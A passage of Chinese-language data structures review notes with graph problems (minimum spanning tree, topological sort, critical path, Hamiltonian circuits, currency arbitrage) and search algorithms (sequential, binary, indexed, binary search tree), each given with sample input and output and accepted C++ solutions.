n;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tinit();\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tcin >> name[i];\n\t\t}\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < n; j++)\n\t\t\t{\n\t\t\t\tcin >> g[i][j];\n\t\t\t}\n\t\t}\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < n; j++)\n\t\t\t{\n\t\t\t\tif (i == j)continue;\n\t\t\t\tif (!g[i][j])g[i][j] = inf;\n\t\t\t}\n\t\t}\n\t\tstring st;\n\t\tcin >> st;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tif (st == name[i])dij(i, n);\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 道路建设 (Ver. I)\n\n题目:\n\n```\n有N个村庄，编号从1到N，你应该建造一些道路，使每个村庄都可以相互连接。\n两个村A和B是相连的，当且仅当A和B之间有一条道路，或者存在一个村C使得在A和C之间有一条道路，并且C和B相连。\n现在一些村庄之间已经有一些道路，你的任务就是修建一些道路，使所有村庄都连通起来，并且所有道路的长度总和是最小的。\n\n输入\n测试数据有多组\n第一行是整数N（3 <= N <= 100），代表村庄的数量。 然后是N行，其中第i行包含N个整数，这些N个整数中的第j个是村庄i和村庄j之间的距离（距离是[1,1000]内的整数）。\n然后是整数Q（0 <= Q <= N *（N + 1）/ 2），接下来是Q行，每行包含两个整数a和b（1 <= a <b <= N），代表着村庄a和村庄b之间的道路已经建成。\n\n输出\n对于每组测试数据\n输出一个整数，表示要构建的道路的长度总和最小值\n```\n\n样例：\n\n```\n3\n0 990 692\n990 0 179\n692 179 0\n1\n1 2\n```\n\n样例输出：\n\n```\n179\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\n#include<algorithm>\n#include<cstring>\nusing namespace std;\n\n#define maxn 1005\n#define inf 0x3f3f3f3f\n\nint g[maxn][maxn];\nint dis[maxn];\nbool vis[maxn];\n\nvoid init()\n{\n\tmemset(g, 0, sizeof g);\n\tmemset(vis, 0, sizeof vis);\n}\n\nvoid prim(int n)\n{\n\tint sum = 0;\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tdis[i] = g[1][i];//从1开始\n\t}\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tint mindis = inf, id;\n\t\tfor (int j = 1; j <= n; j++)\n\t\t{\n\t\t\tif (!vis[j] && mindis > dis[j])\n\t\t\t{\n\t\t\t\tmindis = dis[j];\n\t\t\t\tid = j;\n\t\t\t}\n\t\t}\n\t\tvis[id] = 1;\n\t\tfor (int k = 1; k <= n; k++)\n\t\t{\n\t\t\tif (!vis[k] && dis[k] > g[id][k])\n\t\t\t{\n\t\t\t\tdis[k] = g[id][k];\n\t\t\t}\n\t\t}\n\t}\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tsum += dis[i];\n\t}\n\tcout << sum << endl;\n}\n\nint main()\n{\n\tint n, m;\n\twhile (cin >> n)\n\t{\n\t\tinit();\n\t\tfor (int i = 1; i <= n; i++)\n\t\t{\n\t\t\tfor (int j = 1; j <= n; j++)\n\t\t\t{\n\t\t\t\tcin >> g[i][j];\n\t\t\t}\n\t\t}\n\t\tcin >> m;\n\t\tfor (int i = 0; i < m; i++)\n\t\t{\n\t\t\tint u, v;\n\t\t\tcin >> u >> v;\n\t\t\tg[u][v] = g[v][u] = 0;\n\t\t}\n\t\tprim(n);\n\t}\n}\n```\n\n\n\n#### 图综合练习--拓扑排序\n\n题目:\n\n```\n已知有向图，顶点从0开始编号，求它的求拓扑有序序列。\n\n拓扑排序算法：给出有向图邻接矩阵\n1.逐列扫描矩阵，找出入度为0且编号最小的顶点v\n2.输出v，并标识v已访问\n3.把矩阵第v行全清0\n重复上述步骤，直到所有顶点输出为止\n\n--程序要求--\n若使用C++只能include一个头文件iostream；若使用C语言只能include一个头文件stdio\n程序中若include多过一个头文件，不看代码，作0分处理\n不允许使用第三方对象或函数实现本题的要求\n\n输入\n第一行输入一个整数t，表示有t个有向图\n第二行输入n，表示图有n个顶点\n第三行起，输入n行整数，表示图对应的邻接矩阵\n以此类推输入下一个图的顶点数和邻接矩阵\n\n输出\n每行输出一个图的拓扑有序序列\n```\n\n样例：\n\n```\n2\n5\n0 1 0 1 1\n0 0 1 0 0\n0 0 0 0 1\n0 0 1 0 0\n0 0 0 0 0\n7\n0 0 0 0 0 0 0\n1 0 1 1 0 0 0\n1 0 0 0 0 0 0\n1 0 1 0 0 0 0\n0 0 0 0 0 1 1\n0 1 0 0 0 0 0\n0 0 0 1 0 1 0\n```\n\n样例输出：\n\n```\n0 1 3 2 4 \n4 6 5 1 3 2 0 \n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\n#define maxn 1000\n\nint g[maxn][maxn];\nint in[maxn];\nbool vis[maxn];\n\nvoid init()\n{\n\tfor (int i = 0; i < maxn; i++)\n\t{\n\t\tfor (int j = 0; j < maxn; j++)\n\t\t{\n\t\t\tg[i][j] = 0;\n\t\t}\n\t\tin[i] = vis[i] = 0;\n\t}\n}\n\nvoid topu(int n)\n{\n\tint cnt = 0;\n\twhile (cnt < n)\n\t{\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tif (in[i] == 0 && !vis[i])\n\t\t\t{\n\t\t\t\tcout << i << ' ';\n\t\t\t\tvis[i] = 1;\n\t\t\t\tcnt++;\n\t\t\t\tfor (int j = 0; j < n; j++)\n\t\t\t\t{\n\t\t\t\t\tif (g[i][j])\n\t\t\t\t\t{\n\t\t\t\t\t\tg[i][j] = 0;\n\t\t\t\t\t\tin[j]--;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tcout << endl;\n}\n\nint main()\n{\n\tint n, t;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tinit();\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < n; j++)\n\t\t\t{\n\t\t\t\tcin >> g[i][j];\n\t\t\t\tif (g[i][j])in[j]++;\n\t\t\t}\n\t\t}\n\t\ttopu(n);\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 关键路径-STL版\n\n题目:\n\n```\n给定有向图无环的边信息，求每个顶点的最早开始时间、最迟开始时间。\n\n输入\n第一行图的顶点总数\n第二行边的总数\n第三行开始，每条边的时间长度，格式为源结点   目的结点   长度\n\n输出\n第一行：第个顶点的最早开始时间\n第二行：每个顶点的最迟开始时间\n```\n\n样例：\n\n```\n9\n12\n0 1 3\n0 2 10\n1 3 9\n1 4 13\n2 4 12\n2 5 7\n3 6 8\n3 7 4\n4 7 6\n5 7 11\n6 8 2\n7 8 5\n```\n\n样例输出：\n\n```\n0 3 10 12 22 17 20 28 33 \n0 9 10 23 22 17 31 28 33 \n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\n#include<queue>\n#include<cstring>\nusing namespace std;\n\n#define maxn 1005\n\nstruct edge {\n\tint to, w;\n};\n\nint in[maxn];\nbool vis[maxn];\nint ve[maxn], vl[maxn];\nvector<edge>g[maxn];\nvector<edge>reg[maxn];//逆邻接表\nqueue<int>topusort;\nvector<int>topuans;\n\nvoid topu(int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (!in[i])topusort.push(i), topuans.push_back(i), vis[i] = 1;\n\t}\n\twhile (!topusort.empty())\n\t{\n\t\tint front = topusort.front();\n\t\tfor (auto x : g[front])\n\t\t{\n\t\t\tin[x.to]--;\n\t\t}\n\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tif (!in[j] && !vis[j])topusort.push(j), topuans.push_back(j), vis[j] = 1;\n\t\t}\n\t\ttopusort.pop();\n\t}\n}\n\nvoid calearly(int n)\n{\n\tmemset(vis, 0, sizeof vis);\n\tqueue<int>q;\n\tve[topuans[0]] = 0;\n\tq.push(topuans[0]);\n\twhile(!q.empty())\n\t{\n\t\tint i = q.front();\n\t\tvis[i] = 1;\n\t\tfor (auto x : g[i])\n\t\t{\n\t\t\tif (!vis[x.to] && ve[i] + x.w > ve[x.to])\n\t\t\t{\n\t\t\t\tve[x.to] = ve[i] + x.w;\n\t\t\t\tq.push(x.to);\n\t\t\t}\n\t\t}\n\t\tq.pop();\n\t}\n}\n\nvoid callate(int n)\n{\n\tmemset(vis, 0, sizeof vis);\n\tqueue<int>q;\n\tfor (int i = 0; i < n; i++)vl[i] = 0x3f3f3f3f;\n\tvl[topuans[n - 1]] = ve[topuans[n - 1]];\n\tq.push(topuans[n - 1]);\n\twhile(!q.empty())\n\t{\n\t\tint i = q.front();\n\t\tvis[i] = 1;\n\t\tfor (auto x : reg[i])\n\t\t{\n\t\t\tif (!vis[x.to] && vl[i] - x.w < vl[x.to])\n\t\t\t{\n\t\t\t\tvl[x.to] = vl[i] - x.w;\n\t\t\t\tq.push(x.to);\n\t\t\t}\n\t\t}\n\t\tq.pop();\n\t}\n}\n\nint main()\n{\n\tint n, e;\n\tcin >> n >> e;\n\twhile (e--)\n\t{\n\t\tint u, v, w;\n\t\tcin >> u >> v >> w;\n\t\tg[u].push_back({ v,w });\n\t\treg[v].push_back({ u,w });\n\t\tin[v]++;\n\t}\n\ttopu(n);\n\tcalearly(n);\n\tcallate(n);\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << ve[i] << ' ';\n\t}\n\tcout << endl;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << vl[i] << ' ';\n\t}\n}\n```\n\n\n\n#### 汉密尔顿回路\n\n题目:\n\n```\n著名的“汉密尔顿（Hamilton）回路问题”是要找一个能遍历图中所有顶点的简单回路（即每个顶点只访问 1 次）。本题就要求你判断任一给定的回路是否汉密尔顿回路。\n\n输入\n首先第一行给出两个正整数：无向图中顶点数 N（2<N≤200）和边数 M。随后 M 行，每行给出一条边的两个端点，格式为“顶点1 顶点2”，其中顶点从 1 到N 编号。再下一行给出一个正整数 K，是待检验的回路的条数。随后 K 行，每行给出一条待检回路，格式为：\n\n输出\n对每条待检回路，如果是汉密尔顿回路，就在一行中输出\"YES\"，否则输出\"NO\"。\n```\n\n样例：\n\n```\n6 10\n6 2\n3 4\n1 5\n2 5\n3 1\n4 1\n1 6\n6 3\n1 2\n4 5\n6\n7 5 1 4 3 6 2 5\n6 5 1 4 3 6 2\n9 6 2 1 6 3 4 5 2 6\n4 1 2 5 1\n7 6 1 3 4 5 2 6\n7 6 1 2 5 4 3 1\n```\n\n样例输出：\n\n```\nYES\nNO\nNO\nNO\nYES\nNO\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\n#include<cstring>\nusing namespace std;\n\n#define maxn 1000\n\nvector<int>g[maxn];\nvector<int>hm;\nint vis[maxn];\n\nbool check(int n, int num)\n{\n\tint cnt = 0;\n\tif (hm[0] != hm[num - 1])return false;//不是回路\n\tfor (int i = 0; i < num - 1; i++)\n\t{\n\t\tvis[hm[i]]++;\n\t}\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tif (vis[i])cnt++;\n\t\tif (vis[i] > 1)return false;\n\t}//有重复经过\n\n\tif (cnt < n)return false;//没有经过所有节点\n\n\tfor (int i = 0; i < num - 1; i++)\n\t{\n\t\tbool flag = 0;\n\t\tfor (auto x : g[hm[i]])\n\t\t{\n\t\t\tif (x == hm[i + 1])flag = 1;\n\t\t}\n\t\tif (!flag)return false;\n\t}\n\treturn true;\n}\n\nint main()\n{\n\tint n, m;\n\tcin >> n >> m;\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tint u, v;\n\t\tcin >> u >> v;\n\t\tg[u].push_back(v);\n\t\tg[v].push_back(u);\n\t}\n\tint k;\n\tcin >> k;\n\twhile (k--)\n\t{\n\t\tint num;\n\t\tcin >> num;\n\t\thm.clear();\n\t\tmemset(vis, 0, sizeof vis);\n\t\tfor (int i = 0; i < num; i++)\n\t\t{\n\t\t\tint x;\n\t\t\tcin >> x;\n\t\t\thm.push_back(x);\n\t\t}\n\t\tif (check(n, num))cout << \"YES\" << endl;\n\t\telse cout << \"NO\" << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 货币套汇（图路径）\n\n应用Floyd算法的变种\n\n题目:\n\n```\n套汇是指利用货币汇兑率的差异将一个单位的某种货币转换为大于一个单位的同种货币。例如，假定1 美元可以买0.7 英镑，1 英镑可以买9.5 法郎，1法郎可以买到0.16美元。通过货币兑换，一个商人可以从1 美元开始买入，得到0.7×9.5×0.16=1.064美元，从而获得6.4%的利润。 给定n种货币c1 ,c2 ,... ,cn的有关兑换率，试设计一个有效算法，确定货币间是否存在套汇的可能性。\n提示：判断图上是否出现正环,即环上所有的边相乘大于1\n\n输入\n第一行：测试数据组数\n每组测试数据格式为：\n第一行：正整数n (1< =n< =30)，正整数m，分别表示n种货币和m种不同的货币兑换率。\n2~n+1行，n种货币的名称。\nn+2~n+m+1行，每行有3 个数据项ci，rij 和cj ，表示货币ci 和cj的兑换率为 rij。\n\n输出\n对每组测试数据，如果存在套汇的可能则输出YES\n如果不存在套汇的可能，则输出NO。\n```\n\n样例：\n\n```\n2\n3 3\nUSDollar\nBritishPound\nFrenchFranc\nUSDollar 0.5 BritishPound\nBritishPound 10.0 FrenchFranc\nFrenchFranc 0.21 USDollar\n3 6\nUSDollar\nBritishPound\nFrenchFranc\nUSDollar 0.5 BritishPound\nUSDollar 4.9 FrenchFranc\nBritishPound 10.0 FrenchFranc\nBritishPound 1.99 USDollar\nFrenchFranc 0.09 BritishPound\nFrenchFranc 0.19 USDollar\n```\n\n样例输出：\n\n```\nYES\nNO\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\n#include<iomanip>\n#include<cstring>\n#include<map>\nusing namespace std;\n\n#define maxn 1000\n\nstruct  node {\n\tint to;\n\tdouble w;\n};\n\nstring name[maxn];\ndouble g[maxn][maxn];\nmap<string, int>mp;\n\nvoid init()\n{\n\tfor (int i = 0; i < maxn; i++)name[i] = \"\";\n\tmemset(g, 0, sizeof g);\n\tmp.clear();\n}\n\nvoid floyd(int n)\n{\n\tfor (int k = 0; k < n; k++)\n\t{\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < n; j++)\n\t\t\t{\n\t\t\t\tif (g[i][j] < g[i][k] * g[k][j])\n\t\t\t\t{\n\t\t\t\t\tg[i][j] = g[i][k] * g[k][j];\n\t\t\t\t}\n\t\t\t\tif (g[i][j] && i == j && g[i][j] > 1)\n\t\t\t\t{\n\t\t\t\t\tcout << \"YES\" << endl;\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tcout << \"NO\" << endl;\n}\n\nint main() \n{\n\tint t, n, m;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tinit();\n\t\tcin >> n >> m;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tcin >> name[i];\n\t\t\tmp[name[i]] = i;\n\t\t}\n\t\tfor (int i = 0; i < m; i++)\n\t\t{\n\t\t\tstring a, b;\n\t\t\tdouble rate;\n\t\t\tcin >> a >> rate >> b;\n\t\t\tg[mp[a]][mp[b]] = rate;\n\t\t}\n\t\tfloyd(n);\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 追星\n\n题目:\n\n```\n城市总共有N座。yintama是右京女神的狂热粉，当他得知右京女神将要在城市N举办演唱会的时候，马上开始准备动身前往城市N。原本他可以直接乘飞机直达城市N，然而贫穷使他屈服，他必须选择总花费最少的那条路径。设总共有N座城市(2<=N<=1000），城市编号分别为1,2,3......N。M条航线(1<=M<=2000)，每条航线连接两座城市，相互可以到达（无向的）。yintama目前在身在城市1，求最后yintama参加右京女神演唱会所需要的最少花费。（PS：重边考虑一下？）\n\n输入\n有多组输入。\n第一行输入一个N、M，代表城市的总数，以及航线的总数。\n接下来M行，每行输入三个数字u v w，代表城市u、v之间存在航线，机票花费为w。\n\n输出\n每行输出一个数，代表yintama参加右京女神演唱会所需的最少花费。\n```\n\n样例：\n\n```\n5 5\n1 2 20\n2 3 30\n3 4 20\n4 5 20\n1 5 100\n```\n\n样例输出：\n\n```\n90\n```\n\nAC代码：\n\n```cpp\n//使用prim算法\n#include <bits/stdc++.h>\nusing namespace std;\n\n#define Maxlen 1000\n\nint main()\n{\n    int vexnum, arcnum;\n    int i, j, k;\n    while (cin >> vexnum)     //顶点数\n    {\n        cin >> arcnum;        //边数\n        int sum = 0;\n        int Matrix[vexnum][vexnum];    //邻接矩阵\n        memset(Matrix, 0x3f, sizeof(int) * vexnum * vexnum);   //初始化元素无穷大\n        \n        //读边，设置邻接矩阵\n        for (i = 0; i < arcnum; i++)\n        {\n            int a, b, cost;\n            cin >> a >> b >> cost;\n            if (Matrix[a - 1][b - 1] > cost )//重边\n            {\n                Matrix[a - 1][b - 1] = Matrix[b-1][a-1] = cost;\n            }\n\n        }\n\n        int mmin;\n        int adjvex[Maxlen];\n        int lowcost[Maxlen];\n        bool visited[Maxlen];\n\n        //初始化lowcost,  visited\n        memset(lowcost, 0x3f, sizeof(int)*Maxlen);\n        memset(visited, false, sizeof(bool)*Maxlen);\n        lowcost[0] = 0;          //0, 源点\n        visited[0] = true;       //0, 源点\n        \n\n        //最多vexnum次，选lowcost最小的顶点, 并更新\n        for (i = 0; i < vexnum; i++)\n        {\n            //选visited值为0， lowcost最小的顶点，存入k\n            mmin = 0x3f3f3f3f;\n            k = 0;\n            for (j = 1; j < vexnum; j++)\n            {\n                if (!visited[j] && lowcost[j] < mmin)\n                {\n                    mmin = lowcost[j];\n                    k = j;\n                }\n            }\n\n            //更新k点状态\n            visited[k] = true;\n            //更新从k到各顶点的路径值是否更小\n            for (j = 1; j < vexnum; j++)\n            {\n                if (!visited[j] && Matrix[k][j] + lowcost[k] < lowcost[j])\n                {\n                    lowcost[j] = Matrix[k][j] + lowcost[k];\n                    adjvex[j] = k;\n                }\n            }\n        }\n        //输出城市n的路径值\n        cout << lowcost[vexnum-1] << endl;\n    }\n    return 0;\n}\n```\n\n\n\n\n\n## 查找\n\n#### 平均查找长度ASL\n\n平均查找长度定义为确定记录在表中的位置所进行的和关键字比较的次数的平均值\n$$\nASL=\\sum_{i=1}^n p_iC_i\\\\\nn为查找表的长度，即表中所含元素的个数\\\\\nPi为查找第i个元素的概率(∑Pi=1)\\\\\nCi是查找第i个元素时同给定值K比较的次数\n$$\n\n##### 各查找算法的平均查找长度(假设每个记录查找概率相等)\n\n* 顺序查找：$ASL_{成功}=n*P_1 +(n-1)P_2 +…+ 2P_{n-1}+ P_n = (n+1)/2$\n\n  ​\t\t\t\t\t$ASL_{不成功}= (n+1)/2 + (n+1)/(2*2) = 3(n+1)/4$\n\n* 折半查找：$ASL_{bs}=\\frac{1}{n}\\sum_{i=1}^nC_i=\\frac{n+1}{n}log_2(n+1) - 1$\n\n* 分块查找：\n\n  **分块查找效率最高的方式是索引表用折半查找，数据表用顺序查找，因为索引表是单调的，而数据表不单调**\n\n  若将长度为n的表分成b块，每块含s个记录，并设表中每个记录查找概率相等\n\n  用折半查找方法在索引表中查找索引块，　$ASL_{块间}≈log_2(n/s+1)$\n\n  用顺序查找方法在主表对应块中查找记录，$ASL_{块内}=s/2$\n\n  $ASL≈log_2(n/s+1) + s/2$\n\n#### DS静态查找之顺序查找\n\n注意这题用的是哨兵法\n\n```cpp\nfor(i=n; ;i--)\n      if(elem[i] == key)  retrun i；\n//哨兵法，从后往前查找，数据从下标为1开始存储，下标为0的位置用于存放每次要查找的元素\n//for循环中间的条件可以省略，省略了对下标越界的检查，减少运算次数\n```\n\n\n\n题目:\n\n```\n给出一个队列和要查找的数值，找出数值在队列中的位置，队列位置从1开始\n要求使用带哨兵的顺序查找算法\n\n输入\n第一行输入n，表示队列有n个数据\n第二行输入n个数据，都是正整数，用空格隔开\n第三行输入t，表示有t个要查找的数值\n第四行起，输入t个数值，输入t行\n\n输出\n每行输出一个要查找的数值在队列的位置，如果查找不成功，输出字符串error\n```\n\n样例：\n\n```\n8\n33 66 22 88 11 27 44 55\n3\n22\n11\n99\n```\n\n样例输出：\n\n```\n3\n5\nerror\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint num[1000];\n\nint query(int x, int n)\n{\n\tnum[0] = x;\n\tfor (int i = n;; i--)\n\t{\n\t\tif (x == num[i])return i;\n\t}\n}\n\nint main()\n{\n\tint n, t;\n\tcin >> n;\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tcin >> num[i];\n\t}\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tint ans = query(x, n);\n\t\tif (!ans)cout << \"error\" << endl;\n\t\telse cout << ans << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS静态查找之折半查找\n\n题目与上题一样\n\n样例：\n\n```\n8\n11 22 33 44 55 66 77 88\n3\n22\n88\n99\n```\n\n样例输出：\n\n```\n2\n8\nerror\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint num[1000];\n\nint binquery(int x, int l, int r)\n{\n\twhile (l <= r)\n\t{\n\t\tint mid = (l + r) / 2;\n\t\tif (num[mid] == x)return mid;\n\t\telse if (num[mid] > x)r = mid - 1;\n\t\telse if (num[mid] < x)l = mid + 1;\n\t}\n\treturn 0;\n}\n\nint main()\n{\n\tint n, t;\n\tcin >> n;\n\tfor (int i = 1; i <= n; i++)cin >> num[i];\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tint ans = binquery(x, 1, n);\n\t\tif (!ans)cout << \"error\" << endl;\n\t\telse cout << ans << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS静态查找之顺序索引查找\n\n题目:\n\n```\n给出一个队列和要查找的数值，找出数值在队列中的位置，队列位置从1开始\n要求使用顺序索引查找算法，其中索引表查找和块内查找都采用不带哨兵、从头开始的顺序查找方法。\n\n\n输入\n第一行输入n，表示主表有n个数据\n第二行输入n个数据，都是正整数，用空格隔开\n第三行输入k，表示主表划分为k个块，k也是索引表的长度\n第四行输入k个数据，表示索引表中每个块的最大值\n第五行输入t，表示有t个要查找的数值\n第六行起，输入t个数值，输入t行\n\n输出\n每行输出一个要查找的数值在队列的位置和查找次数，数据之间用短划线隔开，如果查找不成功，输出字符串error\n```\n\n样例：\n\n```\n18\n22 12 13 8 9 20 33 42 44 38 24 48 60 58 74 57 86 53\n3\n22 48 86\n6\n13\n5\n48\n40\n53\n90\n```\n\n样例输出：\n\n```\n3-4\nerror\n12-8\nerror\n18-9\nerror\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nstruct node\n{\n\tint id;\n\tint value;\n};\n\nint num[1000];\nnode index[100];\n\nvoid init(int n, int k)\n{\n\tint ind = 1;\n\tindex[1].id = 1;\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tif (num[i] > index[ind].value)index[++ind].id = i;\n\t}\n\tindex[k + 1].id = n;\n}\n\nvoid query(int n, int k, int x)\n{\n\tint cnt = 0;\n\tint begin = -1, end = -1, ans;\n\tbool isfind = 0;\n\tfor (int i = 1; i <= k; i++)\n\t{\n\t\tcnt++;\n\t\tif (x <= index[i].value)\n\t\t{\n\t\t\tbegin = index[i].id;\n\t\t\tend = index[i + 1].id;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (begin == -1)\n\t{\n\t\tcout << \"error\" << endl;\n\t\treturn;\n\t}\n\tfor (int i = begin; i <= end; i++)\n\t{\n\t\tcnt++;\n\t\tif (x == num[i])\n\t\t{\n\t\t\tisfind = 1;\n\t\t\tans = i;\n\t\t\tbreak;\n\t\t}\n\t}\n\tif (!isfind)cout << \"error\" << endl;\n\telse cout << ans << '-' << cnt << endl;\n}\n\nint main()\n{\n\tint n, t, k;\n\tcin >> n;\n\tfor (int i = 1; i <= n; i++)cin >> num[i];\n\tcin >> k;\n\tfor (int i = 1; i <= k; i++)cin >> index[i].value;\n\tinit(n, k);\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tquery(n, k, x);\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 动态查找之二叉排序树\n\n查找算法：\n\n```\n给定值与根结点比较：\n1.若相等，查找成功\n2.若小于，查找左子树\n3.若大于，查找右子树\n```\n\n* 二叉排序树的平均查找长度：每个节点的深度之和除以节点个数\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201145552527.png\" alt=\"image-20230201145552527\" style=\"zoom:50%;\" />\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201145540269.png\" alt=\"image-20230201145540269\" style=\"zoom:50%;\" />\n\n\n\n#### DS二叉排序树之创建和插入\n\n* 二叉排序树的插入：\n\n  ```\n  当树中不存在查找的结点时，作插入操作\n  新插入的结点一定是叶子结点（只需改动一个结点的指针）\n  该叶子结点是查找不成功时路径上访问的最后一个结点左孩子或右孩子(新结点值小于或大于该结点值)\n  ```\n\n  \n\n题目:\n\n```\n给出一个数据序列，建立二叉排序树，并实现插入功能\n对二叉排序树进行中序遍历，可以得到有序的数据序列\n\n输入\n第一行输入t，表示有t个数据序列\n第二行输入n，表示首个序列包含n个数据\n第三行输入n个数据，都是自然数且互不相同，数据之间用空格隔开\n第四行输入m，表示要插入m个数据\n从第五行起，输入m行，每行一个要插入的数据，都是自然数且和前面的数据不等\n以此类推输入下一个示例\n\n输出\n第一行输出有序的数据序列，对二叉排序树进行中序遍历可以得到\n从第二行起，输出插入第m个数据后的有序序列，输出m行\n以此类推输出下一个示例的结果\n```\n\n样例：\n\n```\n1\n6\n22 33 55 66 11 44\n3\n77\n50\n10\n```\n\n样例输出：\n\n```\n11 22 33 44 55 66 \n11 22 33 44 55 66 77 \n11 22 33 44 50 55 66 77 \n10 11 22 33 44 50 55 66 77 \n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\nusing namespace std;\n\nstruct node {\n\tint id;\n\tint value;\n\tint ls = -1, rs = -1;\n};\n\nint treenodes = 0;\nvector<node>BIT;\n\nvoid insert(int x, int parents, int state, int pos)\n{\n\tif (BIT.empty() || pos == -1)\n\t{\n\t\tBIT.push_back({ treenodes++,x,-1,-1 });\n\t\tif (state == 1)BIT[parents].ls = treenodes - 1;\n\t\telse if (state == 2)BIT[parents].rs = treenodes - 1;\n\t\treturn;\n\t}\n\telse\n\t{\n\t\t{\n\t\t\tif (x < BIT[pos].value)\n\t\t\t{\n\t\t\t\tinsert(x, pos, 1, BIT[pos].ls);\n\t\t\t}\n\t\t\telse insert(x, pos, 2, BIT[pos].rs);\n\t\t}\n\t}\n}//使用插入节点的方式建树\n\nvoid inorder(int pos)\n{\n\tif (pos == -1)return;\n\tint ls = BIT[pos].ls, rs = BIT[pos].rs;\n\tif (ls == -1 && rs == -1)\n\t{\n\t\tcout << BIT[pos].value << ' ';\n\t}\n\telse\n\t{\n\t\tinorder(ls);\n\t\tcout << BIT[pos].value << ' ';\n\t\tinorder(rs);\n\t}\n}//中序遍历\n\nint main()\n{\n\tint t, n, m;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tint x;\n\t\t\tcin >> x;\n\t\t\tinsert(x, 0, 0, 0);\n\t\t}\n\t}\n\tinorder(0);\n\tcout << endl;\n\tcin >> m;\n\twhile (m--) \n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tinsert(x, 0, 0, 0);\n\t\tinorder(0);\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS二叉排序树之查找\n\n题目:\n\n```\n给出一个数据序列，建立二叉排序树，并实现查找功能\n对二叉排序树进行中序遍历，可以得到有序的数据序列\n\n输入\n第一行输入t，表示有t个数据序列\n第二行输入n，表示首个序列包含n个数据\n第三行输入n个数据，都是自然数且互不相同，数据之间用空格隔开\n第四行输入m，表示要查找m个数据\n从第五行起，输入m行，每行一个要查找的数据，都是自然数\n以此类推输入下一个示例\n\n输出\n第一行输出有序的数据序列，对二叉排序树进行中序遍历可以得到\n从第二行起，输出查找结果，如果查找成功输出查找次数，如果查找失败输出-1\n以此类推输出下一个示例的结果\n```\n\n样例：\n\n```\n1\n6\n22 33 55 66 11 44\n7\n11\n22\n33\n44\n55\n66\n77\n```\n\n样例输出：\n\n```\n11 22 33 44 55 66 \n2\n1\n2\n4\n3\n4\n-1\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\nusing namespace std;\n\nstruct node {\n\tint id;\n\tint value;\n\tint ls = -1, rs = -1;\n};\n\nint treenodes = 0;\nbool isfind = 0;\nvector<node>BIT;\n\nvoid insert(int x, int parents, int state, int pos)\n{\n\tif (BIT.empty() || pos == -1)\n\t{\n\t\tBIT.push_back({ treenodes++,x,-1,-1 });\n\t\tif (state == 1)BIT[parents].ls = treenodes - 1;\n\t\telse if (state == 2)BIT[parents].rs = treenodes - 1;\n\t\treturn;\n\t}\n\telse\n\t{\n\t\t{\n\t\t\tif (x < BIT[pos].value)\n\t\t\t{\n\t\t\t\tinsert(x, pos, 1, BIT[pos].ls);\n\t\t\t}\n\t\t\telse insert(x, pos, 2, BIT[pos].rs);\n\t\t}\n\t}\n}\n\nvoid inorder(int pos)\n{\n\tif (pos == -1)return;\n\tint ls = BIT[pos].ls, rs = BIT[pos].rs;\n\tif (ls == -1 && rs == -1)\n\t{\n\t\tcout << BIT[pos].value << ' ';\n\t}\n\telse\n\t{\n\t\tinorder(ls);\n\t\tcout << 